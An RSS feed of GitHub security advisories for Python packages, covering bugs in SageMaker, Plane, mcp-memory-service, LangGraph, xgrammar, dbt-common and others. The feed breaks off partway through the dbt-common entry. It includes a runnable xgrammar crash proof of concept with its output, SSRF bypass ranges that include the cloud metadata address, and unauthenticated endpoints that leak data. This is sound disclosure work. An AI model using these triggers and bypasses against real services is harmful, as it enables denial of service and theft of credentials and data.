<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-05T23:21:39.085Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[sagemaker] SageMaker Python SDK replaced eval() with safe parser in JumpStart search functionality]]></title>
        <id>https://github.com/advisories/GHSA-5r2p-pjr8-7fh7</id>
        <link href="https://github.com/advisories/GHSA-5r2p-pjr8-7fh7"/>
        <updated>2026-03-05T22:01:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>This advisory addresses the use of the search_hub() function within the SageMaker Python SDK's JumpStart search functionality. An actor with the ability to control query parameters passed to the search_hub() function could potentially provide malformed input that causes the eval() function to execute arbitrary commands, access sensitive data, or compromise the execution environment.</p>
<p>A defense-in-depth enhancement has been implemented to replace code evaluation with safe string operations when processing search query parameters. This enhancement removes the use of eval() from the execution path, replacing it with a safe recursive descent parser. The change was released in SageMaker Python SDK version 3.4.0 on January 23, 2026. This advisory is informational to help customers understand their responsibilities regarding input validation and configuration security under the <a href="https://aws.amazon.com/compliance/shared-responsibility-model/">AWS Shared Responsibility Model</a>.</p>
<h2 id="impact">Impact</h2>
<p>Customer applications that pass unsanitized or untrusted input directly to the search_hub() function's query parameter could be prone to Remote Code Execution (RCE), potentially allowing attackers to execute arbitrary commands, access sensitive data, or compromise the&nbsp;execution environment. While the SDK was functioning within the requirements of the shared responsibility model—where input sanitization falls on the customer side—additional safeguards have been added to support secure customer implementations and provide defense-in-depth protection.</p>
<p><strong>Impacted versions:</strong> All versions of SageMaker Python SDK prior to 3.4.0</p>
<h2 id="patches">Patches</h2>
<p>On January 23, 2026, an enhancement was made to SageMaker Python SDK version 3.4.0, which replaces eval() with a safe recursive descent parser that uses string operations for pattern matching with proper operator precedence and exception handling. We recommend upgrading to version 3.4.0 or later, using the following command:</p>
<pre><code>pip install --upgrade sagemaker&gt;=3.4.0
</code></pre>
<p>Customers using forked or derivative code should incorporate the fixes from the referenced pull request.</p>
<h2 id="workarounds">Workarounds</h2>
<p>No workarounds are needed, but as always you should ensure that your application is following security best practices:</p>
<ul>
<li>Sanitize and validate input to SDK methods to ensure only expected formats are processed</li>
<li>Update to the latest SageMaker Python SDK release on a regular basis</li>
<li>Follow AWS security best practices for SDK configuration and usage</li>
<li>Ensure proper access controls are in place for environments where the SDK is deployed</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li>Fixed in PR: <a href="https://github.com/aws/sagemaker-python-sdk/pull/5497">https://github.com/aws/sagemaker-python-sdk/pull/5497</a></li>
<li>Release: <a href="https://pypi.org/project/sagemaker/3.4.0/">https://pypi.org/project/sagemaker/3.4.0/</a></li>
<li>AWS Shared Responsibility Model: <a href="https://aws.amazon.com/compliance/shared-responsibility-model/">https://aws.amazon.com/compliance/shared-responsibility-model/</a></li>
</ul>
<p>If you have any questions or comments about this advisory, contact AWS Security via our <a href="https://aws.amazon.com/security/vulnerability-reporting/">vulnerability reporting page</a> or email <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h2 id="acknowledgement">Acknowledgement</h2>
<p>We thank Dan Aridor (@daridor9) and the security research community for bringing these customer security considerations to our attention through the coordinated disclosure process and for collaborating on this issue through responsible disclosure practices.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-5r2p-pjr8-7fh7">https://github.com/aws/sagemaker-python-sdk/security/advisories/GHSA-5r2p-pjr8-7fh7</a></li>
<li><a href="https://github.com/aws/sagemaker-python-sdk/pull/5497">https://github.com/aws/sagemaker-python-sdk/pull/5497</a></li>
<li><a href="https://github.com/aws/sagemaker-python-sdk/commit/e706e578519bd9b92ea44b9b15f872eca5e77ea4">https://github.com/aws/sagemaker-python-sdk/commit/e706e578519bd9b92ea44b9b15f872eca5e77ea4</a></li>
<li><a href="https://github.com/advisories/GHSA-5r2p-pjr8-7fh7">https://github.com/advisories/GHSA-5r2p-pjr8-7fh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5r2p-pjr8-7fh7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-05T22:01:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Markdown] Python-Markdown has an Uncaught Exception]]></title>
        <id>https://github.com/advisories/GHSA-5wmx-573v-2qwq</id>
        <link href="https://github.com/advisories/GHSA-5wmx-573v-2qwq"/>
        <updated>2026-03-05T21:59:47.000Z</updated>
        <content type="html"><![CDATA[<p>Python-Markdown version 3.8 contain a vulnerability where malformed HTML-like sequences can cause html.parser.HTMLParser to raise an unhandled AssertionError during Markdown parsing. Because Python-Markdown does not catch this exception, any application that processes attacker-controlled Markdown may crash. This enables remote, unauthenticated Denial of Service in web applications, documentation systems, CI/CD pipelines, and any service that renders untrusted Markdown. The issue was acknowledged by the vendor and fixed in version 3.8.1. This issue causes a remote Denial of Service in any application parsing untrusted Markdown, and can lead to Information Disclosure through uncaught exceptions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-69534">https://nvd.nist.gov/vuln/detail/CVE-2025-69534</a></li>
<li><a href="https://github.com/Python-Markdown/markdown/issues/1534">https://github.com/Python-Markdown/markdown/issues/1534</a></li>
<li><a href="https://github.com/Python-Markdown/markdown">https://github.com/Python-Markdown/markdown</a></li>
<li><a href="https://github.com/Python-Markdown/markdown/actions/runs/15736122892">https://github.com/Python-Markdown/markdown/actions/runs/15736122892</a></li>
<li><a href="https://github.com/Python-Markdown/markdown/pull/1535">https://github.com/Python-Markdown/markdown/pull/1535</a></li>
<li><a href="https://github.com/advisories/GHSA-5wmx-573v-2qwq">https://github.com/advisories/GHSA-5wmx-573v-2qwq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wmx-573v-2qwq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T15:30:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[plane] Plane is Vulnerable to Unauthenticated Workspace Member Information Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-87x4-j8vh-p5qf</id>
        <link href="https://github.com/advisories/GHSA-87x4-j8vh-p5qf"/>
        <updated>2026-03-05T21:48:12.000Z</updated>
        <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
<p>A security vulnerability exists in the Plane project management platform that allows unauthenticated attackers to enumerate workspace members and extract sensitive information including email addresses, user roles, and internal identifiers. The vulnerability stems from Django REST Framework permission classes being incorrectly configured to allow anonymous access to protected endpoints.</p>
<p>This vulnerability enables attackers to:</p>
<ul>
<li>Enumerate all members of any workspace without authentication</li>
<li>Extract user email addresses and personally identifiable information (PII)</li>
<li>Identify administrative accounts for targeted attacks</li>
<li>Map organizational structure and user roles</li>
<li>Conduct reconnaissance for social engineering attacks</li>
</ul>
<p><strong>Affected Endpoints:</strong></p>
<pre><code>GET /api/public/workspaces/{workspace_slug}/members/
GET /api/public/workspaces/{workspace_slug}/projects/{project_id}/members/
</code></pre>
<p>A fix is available at <a href="https://github.com/makeplane/plane/releases/tag/v1.2.3">https://github.com/makeplane/plane/releases/tag/v1.2.3</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/makeplane/plane/security/advisories/GHSA-87x4-j8vh-p5qf">https://github.com/makeplane/plane/security/advisories/GHSA-87x4-j8vh-p5qf</a></li>
<li><a href="https://github.com/advisories/GHSA-87x4-j8vh-p5qf">https://github.com/advisories/GHSA-87x4-j8vh-p5qf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87x4-j8vh-p5qf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-05T21:48:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[plane] Plane has SSRF via Incomplete IP Validation in Webhook URL Serializer]]></title>
        <id>https://github.com/advisories/GHSA-fpx8-73gf-7x73</id>
        <link href="https://github.com/advisories/GHSA-fpx8-73gf-7x73"/>
        <updated>2026-03-05T21:43:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The webhook URL validation in <code>plane/app/serializers/webhook.py</code> only checks <code>ip.is_loopback</code>, allowing attackers with workspace ADMIN role to create webhooks pointing to private/internal network addresses (<code>10.x.x.x</code>, <code>172.16.x.x</code>, <code>192.168.x.x</code>, <code>169.254.169.254</code>, etc.). When webhook events fire, the server makes requests to these internal addresses and stores the response — enabling SSRF with full response read-back.</p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Cloud metadata exfiltration</strong>: Access AWS/GCP/Azure instance metadata (IAM credentials, tokens)</li>
<li><strong>Internal service scanning</strong>: Probe internal network services not exposed to the internet</li>
<li><strong>Data exfiltration via response logs</strong>: Full response body from internal services is stored and returned to the attacker through the webhook logs API</li>
<li>Bypass vectors: <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code>, <code>169.254.0.0/16</code>, <code>0.0.0.0</code>, <code>::ffff:</code> mapped addresses</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/makeplane/plane/security/advisories/GHSA-fpx8-73gf-7x73">https://github.com/makeplane/plane/security/advisories/GHSA-fpx8-73gf-7x73</a></li>
<li><a href="https://github.com/advisories/GHSA-fpx8-73gf-7x73">https://github.com/advisories/GHSA-fpx8-73gf-7x73</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpx8-73gf-7x73</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-05T21:43:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-memory-service] mcp-memory-service Vulnerable to System Information Disclosure via Health Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-73hc-m4hx-79pj</id>
        <link href="https://github.com/advisories/GHSA-73hc-m4hx-79pj"/>
        <updated>2026-03-05T21:42:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>/api/health/detailed</code> endpoint returns detailed system information including OS version, Python version, CPU count, memory totals, disk usage, and the full database filesystem path. When <code>MCP_ALLOW_ANONYMOUS_ACCESS=true</code> is set (required for the HTTP server to function without OAuth/API key), this endpoint is accessible without authentication. Combined with the default <code>0.0.0.0</code> binding, this exposes sensitive reconnaissance data to the entire network.</p>
<h3 id="details">Details</h3>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<p><strong><code>health.py:90-101</code> - System information collection</strong></p>
<pre><code class="language-python">system_info = {
    "platform": platform.system(),              # e.g., "Linux", "Darwin"
    "platform_version": platform.version(),     # Full OS kernel version string
    "python_version": platform.python_version(),# e.g., "3.12.1"
    "cpu_count": psutil.cpu_count(),            # CPU core count
    "memory_total_gb": round(memory_info.total / (1024**3), 2),
    "memory_available_gb": round(memory_info.available / (1024**3), 2),
    "memory_percent": memory_info.percent,
    "disk_total_gb": round(disk_info.total / (1024**3), 2),
    "disk_free_gb": round(disk_info.free / (1024**3), 2),
    "disk_percent": round((disk_info.used / disk_info.total) * 100, 2)
}
</code></pre>
<p><strong><code>health.py:131-132</code> - Database path disclosure</strong></p>
<pre><code class="language-python">if hasattr(storage, 'db_path'):
    storage_info["database_path"] = storage.db_path  # Full filesystem path
</code></pre>
<h3 id="authentication-bypass-path">Authentication Bypass Path</h3>
<p>The <code>/api/health/detailed</code> endpoint uses <code>require_read_access</code> which calls <code>get_current_user</code>. When <code>MCP_ALLOW_ANONYMOUS_ACCESS=true</code>, the auth middleware grants access:</p>
<pre><code class="language-python"># middleware.py:372-379
if ALLOW_ANONYMOUS_ACCESS:
    logger.debug("Anonymous access explicitly enabled, granting read-only access")
    return AuthenticationResult(
        authenticated=True,
        client_id="anonymous",
        scope="read",
        auth_method="none"
    )
</code></pre>
<p><strong>Note</strong>: The basic <code>/health</code> endpoint (line 68) has <strong>no auth dependency at all</strong> and returns version and uptime information unconditionally.</p>
<h3 id="information-exposed">Information Exposed</h3>
<table>
<thead>
<tr>
<th>Field</th>
<th>Example Value</th>
<th>Reconnaissance Value</th>
</tr>
</thead>
<tbody><tr>
<td><code>platform</code></td>
<td><code>"Linux"</code></td>
<td>OS fingerprinting</td>
</tr>
<tr>
<td><code>platform_version</code></td>
<td><code>"#1 SMP PREEMPT_DYNAMIC..."</code></td>
<td>Kernel version → CVE targeting</td>
</tr>
<tr>
<td><code>python_version</code></td>
<td><code>"3.12.1"</code></td>
<td>Python CVE targeting</td>
</tr>
<tr>
<td><code>cpu_count</code></td>
<td><code>8</code></td>
<td>Resource enumeration</td>
</tr>
<tr>
<td><code>memory_total_gb</code></td>
<td><code>32.0</code></td>
<td>Infrastructure profiling</td>
</tr>
<tr>
<td><code>database_path</code></td>
<td><code>"/home/user/.mcp-memory/memories.db"</code></td>
<td>Username + file path disclosure</td>
</tr>
<tr>
<td><code>database_size_mb</code></td>
<td><code>45.2</code></td>
<td>Data volume estimation</td>
</tr>
</tbody></table>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker scans the local network for services on port 8000</li>
<li>Finds mcp-memory-service with HTTP enabled and anonymous access</li>
<li>Calls <code>GET /api/health/detailed</code>  (no credentials needed)</li>
<li>Receives OS version, Python version, full database path (revealing username), system resources</li>
<li>Uses this information to:<ul>
<li>Target known CVEs for the specific OS/Python version</li>
<li>Identify the database file location for potential direct access</li>
<li>Profile the system for further attacks</li>
</ul>
</li>
</ol>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># Show the system info that would be exposed
import platform, psutil

system_info = {
    "platform": platform.system(),
    "platform_version": platform.version(),
    "python_version": platform.python_version(),
    "cpu_count": psutil.cpu_count(),
    "memory_total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
}
print(system_info)  # All of this is returned to unauthenticated users
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>OS fingerprinting</strong>: Exact OS and kernel version enables targeted exploit selection</li>
<li><strong>Path disclosure</strong>: Database path reveals username, home directory structure, and file locations</li>
<li><strong>Resource enumeration</strong>: CPU, memory, and disk info reveal infrastructure scale</li>
<li><strong>Reconnaissance enablement</strong>: Combined information significantly reduces attacker effort for follow-up attacks</li>
</ul>
<h2 id="remediation">Remediation</h2>
<ol>
<li><strong>Remove system details from default health endpoint</strong> - return only <code>status</code>, <code>version</code>, <code>uptime</code>:</li>
</ol>
<pre><code class="language-python">@router.get("/health/detailed")
async def detailed_health_check(
    storage: MemoryStorage = Depends(get_storage),
    user: AuthenticationResult = Depends(require_write_access)  # Require admin/write access
):
    # Only return storage stats, not system info
    ...
</code></pre>
<ol start="2">
<li><strong>Do not expose <code>database_path</code></strong> - this leaks the filesystem structure:</li>
</ol>
<pre><code class="language-python"># Remove or redact
# storage_info["database_path"] = storage.db_path  # REMOVE THIS
</code></pre>
<ol start="3">
<li><strong>Add auth to basic <code>/health</code></strong> or limit it to status-only (no version):</li>
</ol>
<pre><code class="language-python">@router.get("/health")
async def health_check():
    return {"status": "healthy"}  # No version, no uptime
</code></pre>
<p>Alternatively, <strong>Bind to <code>127.0.0.1</code> by default</strong> instead of <code>0.0.0.0</code>, preventing network-based reconnaissance entirely:</p>
<pre><code class="language-python"># In config.py — change default from '0.0.0.0' to '127.0.0.1'
HTTP_HOST = os.getenv('MCP_HTTP_HOST', '127.0.0.1')
</code></pre>
<p>Users who need network access can explicitly set <code>MCP_HTTP_HOST=0.0.0.0</code>, making the exposure a conscious opt-in rather than a default.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-73hc-m4hx-79pj">https://github.com/doobidoo/mcp-memory-service/security/advisories/GHSA-73hc-m4hx-79pj</a></li>
<li><a href="https://github.com/doobidoo/mcp-memory-service/commit/18f4323ca92763196aa2922f691dfbeb6bd84e48">https://github.com/doobidoo/mcp-memory-service/commit/18f4323ca92763196aa2922f691dfbeb6bd84e48</a></li>
<li><a href="https://github.com/advisories/GHSA-73hc-m4hx-79pj">https://github.com/advisories/GHSA-73hc-m4hx-79pj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73hc-m4hx-79pj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T21:42:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-allauth] django-allauth has an open redirect vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-2jpr-83rg-v67j</id>
        <link href="https://github.com/advisories/GHSA-2jpr-83rg-v67j"/>
        <updated>2026-03-05T21:15:26.000Z</updated>
        <content type="html"><![CDATA[<p>An open redirect vulnerability exists in django-allauth versions prior to 65.14.1 when SAML IdP initiated SSO is enabled (it is disabled by default), which may allow an attacker to redirect users to an arbitrary external website via a crafted URL.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27982">https://nvd.nist.gov/vuln/detail/CVE-2026-27982</a></li>
<li><a href="https://allauth.org/news/2026/02/django-allauth-65.14.1-released">https://allauth.org/news/2026/02/django-allauth-65.14.1-released</a></li>
<li><a href="https://jvn.jp/en/jp/JVN23669411">https://jvn.jp/en/jp/JVN23669411</a></li>
<li><a href="https://github.com/advisories/GHSA-2jpr-83rg-v67j">https://github.com/advisories/GHSA-2jpr-83rg-v67j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2jpr-83rg-v67j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T06:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langgraph] LangGraph checkpoint loading has unsafe msgpack deserialization]]></title>
        <id>https://github.com/advisories/GHSA-g48c-2wqr-h844</id>
        <link href="https://github.com/advisories/GHSA-g48c-2wqr-h844"/>
        <updated>2026-03-05T22:37:27.000Z</updated>
        <content type="html"><![CDATA[<p>LangGraph checkpointers can load msgpack-encoded checkpoints that reconstruct Python objects during deserialization. If an attacker can modify checkpoint data in the backing store (for example, after a database compromise or other privileged write access to the persistence layer), they can potentially supply a crafted payload that triggers unsafe object reconstruction when the checkpoint is loaded.</p>
<p>This is a <strong>post-exploitation / defense-in-depth</strong> issue. Exploitation requires the ability to write attacker-controlled checkpoint bytes at rest. In most deployments that prerequisite already implies a serious incident; the additional risk is turning “checkpoint-store write access” into code execution in the application runtime, which can expand blast radius (for example by exposing environment variables or cloud credentials available to the runtime).</p>
<p>There is no evidence of exploitation in the wild, and LangGraph is not aware of a practical exploitation path in existing deployments today. This change is intended to reduce the blast radius of a checkpoint-store compromise.</p>
<h2 id="affected-users--systems">Affected users / systems</h2>
<p>Users may be affected if they:</p>
<ul>
<li>Use a persistent checkpointer (database, remote store, shared filesystem, etc.),</li>
<li>Load/resume from checkpoints, and</li>
<li>Operate in an environment where an attacker could gain privileged write access to checkpoint data in the backing store.</li>
</ul>
<p>This issue requires the attacker to be able to modify persisted checkpoint bytes (or to compromise a trusted component that writes them). It is generally not reachable by an unauthenticated remote attacker in a correctly configured deployment.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Potential <strong>arbitrary code execution</strong> or other unsafe side effects during checkpoint deserialization.</li>
<li>Escalation from “write access to checkpoint store” to “code execution in the application runtime,” which may expose runtime secrets or provide access to other systems the runtime can reach.</li>
</ul>
<h2 id="exploitation-scenario-high-level">Exploitation scenario (high level)</h2>
<ol>
<li>Attacker gains privileged write access to the checkpoint store (for example, via database compromise, leaked credentials, or abuse of an administrative data path).</li>
<li>Attacker writes a crafted checkpoint payload containing msgpack data intended to reconstruct dangerous objects.</li>
<li>Application resumes and deserializes the checkpoint; unsafe reconstruction could execute attacker-controlled behavior.</li>
</ol>
<h2 id="mitigation--remediation">Mitigation / remediation</h2>
<p>LangGraph provides an allowlist-based hardening mechanism for msgpack checkpoint deserialization.</p>
<h3 id="strict-mode-environment-variable">Strict mode (environment variable)</h3>
<ul>
<li><strong><code>LANGGRAPH_STRICT_MSGPACK</code></strong><ul>
<li>When set truthy (<code>1</code>, <code>true</code>, <code>yes</code>), the default msgpack deserialization policy becomes strict.</li>
<li>Concretely: <code>JsonPlusSerializer()</code> will default <code>allowed_msgpack_modules</code> to <code>None</code> (strict) instead of <code>True</code> (warn-and-allow), unless <code>allowed_msgpack_modules=...</code> is explicitly passed.</li>
</ul>
</li>
</ul>
<h3 id="allowed_msgpack_modules-serializercheckpointer-config"><code>allowed_msgpack_modules</code> (serializer/checkpointer config)</h3>
<p>This setting controls what msgpack “ext” types are allowed to be reconstructed.</p>
<ul>
<li><code>True</code> (default when strict mode is not enabled): allow all ext types, but log a warning when deserializing a type that is not explicitly registered.</li>
<li><code>None</code> (strict): only a built-in safe set is reconstructed; other ext types are blocked.</li>
<li><code>[(module, class_name), ...]</code> (strict allowlist): the built-in safe set plus exactly the listed symbols are reconstructed (exact-match).</li>
</ul>
<h3 id="built-in-safe-set">Built-in safe set</h3>
<p>A small set of types is always treated as safe to reconstruct (for example <code>datetime</code> types, <code>uuid.UUID</code>, <code>decimal.Decimal</code>, <code>set</code>/<code>frozenset</code>/<code>deque</code>, <code>ipaddress</code> types, <code>pathlib</code> paths, <code>zoneinfo.ZoneInfo</code>, compiled regex patterns, and selected LangGraph internal types).</p>
<h3 id="automatically-derived-allowlist-only-when-compiling-graphs">Automatically derived allowlist (only when compiling graphs)</h3>
<p>When <code>LANGGRAPH_STRICT_MSGPACK</code> is enabled and you compile a <code>StateGraph</code>, LangGraph derives an allowlist from the graph’s schemas and channels and applies it to the checkpointer.</p>
<ul>
<li>The allowlist is built by walking the state/input/output/context schemas (plus node/branch input schemas) and channel value/update types. It includes Pydantic v1/v2 models, dataclasses, enums, TypedDict field types, and common typing constructs (containers, unions, <code>Annotated</code>).</li>
<li>LangGraph also includes a curated set of common LangChain message classes.</li>
</ul>
<p>This derived allowlist is only applied if the selected checkpointer supports <code>with_allowlist(...)</code>. If users are constructing serializers/checkpointers manually (or using a checkpointer that does not support allowlist propagation), they will need to configure <code>allowed_msgpack_modules</code> themselves.</p>
<h3 id="operational-guidance">Operational guidance</h3>
<ul>
<li>Treat checkpoint stores as integrity-sensitive. Restrict write access and rotate credentials if compromise is suspected.</li>
<li>Enable strict mode (<code>LANGGRAPH_STRICT_MSGPACK=true</code>) in production if feasible, and rely on schema-driven allowlisting to reduce incompatibilities.</li>
<li>Avoid providing custom msgpack deserialization hooks that reconstruct arbitrary types unless checkpoint data is fully trusted.</li>
</ul>
<h2 id="limitations--important-notes">Limitations / important notes</h2>
<ul>
<li>If a checkpointer implementation does <strong>not</strong> support allowlist application (i.e., does not implement <code>with_allowlist</code>), allowlist enforcement may be skipped (with a warning). In that situation, strict expectations may not hold.</li>
<li>If an application supplies a custom msgpack unpack hook (<code>ext_hook</code>), the custom hook controls reconstruction and can bypass the default allowlist checks (intentional escape hatch, but it weakens the protection).</li>
</ul>
<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
<p>LangSmith is not aware of this issue presenting risk to existing LangSmith-hosted deployments. The described threat model requires an attacker to tamper with the checkpoint persistence layer used by the deployment; typical hosted configurations are designed to prevent such access.</p>
<p>First reported by:  yardenporat353</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langgraph/security/advisories/GHSA-g48c-2wqr-h844">https://github.com/langchain-ai/langgraph/security/advisories/GHSA-g48c-2wqr-h844</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28277">https://nvd.nist.gov/vuln/detail/CVE-2026-28277</a></li>
<li><a href="https://github.com/advisories/GHSA-g48c-2wqr-h844">https://github.com/advisories/GHSA-g48c-2wqr-h844</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g48c-2wqr-h844</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-05T20:19:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[xgrammar] xgrammar vulnerable to DoS via multi-layer nesting]]></title>
        <id>https://github.com/advisories/GHSA-7rgv-gqhr-fxg3</id>
        <link href="https://github.com/advisories/GHSA-7rgv-gqhr-fxg3"/>
        <updated>2026-03-05T20:42:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The multi-level nested syntax caused a segmentation fault (core dump).</p>
<h3 id="details">Details</h3>
<p>A trigger stack overflow or memory exhaustion was caused by constructing a malicious grammar rule containing 30,000 layers of nested parentheses.</p>
<h3 id="poc">PoC</h3>
<pre><code>#!/usr/bin/env python3
"""
XGrammar - Math Expression Generation Example
"""

import xgrammar as xgr
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer, AutoConfig

s = '(' * 30000 + 'a'
grammar = f"root ::= {s}"

def main():
    device = "cuda" if torch.cuda.is_available() else "cpu"
    model_name = "Qwen/Qwen2.5-0.5B-Instruct"
    
    # Load model
    model = AutoModelForCausalLM.from_pretrained(
        model_name,
        torch_dtype=torch.float16 if device == "cuda" else torch.float32,
        device_map=device
    )
    tokenizer = AutoTokenizer.from_pretrained(model_name)
    config = AutoConfig.from_pretrained(model_name)
    
    # Math expression grammar
    math_grammar = grammar
    
    # Setup
    tokenizer_info = xgr.TokenizerInfo.from_huggingface(
        tokenizer,
        vocab_size=config.vocab_size
    )
    compiler = xgr.GrammarCompiler(tokenizer_info)
    compiled_grammar = compiler.compile_grammar(math_grammar)
    
    # Generate
    prompt = "Math: "
    inputs = tokenizer(prompt, return_tensors="pt").to(device)
    
    xgr_processor = xgr.contrib.hf.LogitsProcessor(compiled_grammar)
    
    output_ids = model.generate(
        **inputs,
        max_new_tokens=50,
        logits_processor=[xgr_processor]
    )
    
    result = tokenizer.decode(
        output_ids[0][len(inputs.input_ids[0]):],
        skip_special_tokens=True
    )
    
    print(f"Generated expression: {result}")

if __name__ == "__main__":
    main()
</code></pre>
<pre><code>&gt; pip show xgrammar
Name: xgrammar
Version: 0.1.31
Summary: Efficient, Flexible and Portable Structured Generation
Home-page: 
Author: MLC Team
Author-email: 
License: Apache 2.0
Location: /home/yuelinwang/.local/lib/python3.10/site-packages
Requires: numpy, pydantic, torch, transformers, triton, typing-extensions
Required-by: 

&gt; python3 1.py 
`torch_dtype` is deprecated! Use `dtype` instead!
Segmentation fault (core dumped)
</code></pre>
<h3 id="impact">Impact</h3>
<p>DoS</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-7rgv-gqhr-fxg3">https://github.com/mlc-ai/xgrammar/security/advisories/GHSA-7rgv-gqhr-fxg3</a></li>
<li><a href="https://github.com/mlc-ai/xgrammar/releases/tag/v0.1.32">https://github.com/mlc-ai/xgrammar/releases/tag/v0.1.32</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25048">https://nvd.nist.gov/vuln/detail/CVE-2026-25048</a></li>
<li><a href="https://github.com/advisories/GHSA-7rgv-gqhr-fxg3">https://github.com/advisories/GHSA-7rgv-gqhr-fxg3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7rgv-gqhr-fxg3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-05T18:20:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dbt-common] dbt-common's commonprefix() doesn't protect against path traversal]]></title>
        <id>https://github.com/advisories/GHSA-w75w-9qv4-j5xj</id>
        <link href="https://github.com/advisories/GHSA-w75w-9qv4-j5xj"/>
        <updated>2026-03-05T22:05:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>A path traversal vulnerability exists in dbt-common's <code>safe_extract()</code> function used when extracting tarball archives. The function uses <code>os.path.commonprefix()</code> to validate that extracted files remain within the intended destination directory. However, <code>commonprefix()</code> compares paths character-by-character rather than by path components, allowing a malicious tarball to write files to sibling directories with matching name prefixes.</p>
<p>For example, when extracting to <code>/tmp/packages</code>, a crafted tarball could write files to <code>/tmp/packagesevil/</code> by exploiting the character-based prefix matching.</p>
<p>This vulnerability affects users who:</p>
<ul>
<li>Install dbt packages from untrusted sources</li>
<li>Process tarball archives through dbt-common's extraction utilities</li>
</ul>
<p>The practical risk is limited because:</p>
<ul>
<li>Exploitation requires a malicious tarball to be processed</li>
<li>File writes are restricted to sibling directories with matching prefixes (not arbitrary paths)</li>
<li>Packages from trusted sources (dbt Hub) are not affected</li>
</ul>
<p>This is similar to CVE-2026-1703 in pip, which had a CVSS score of 3.9 (Low).</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
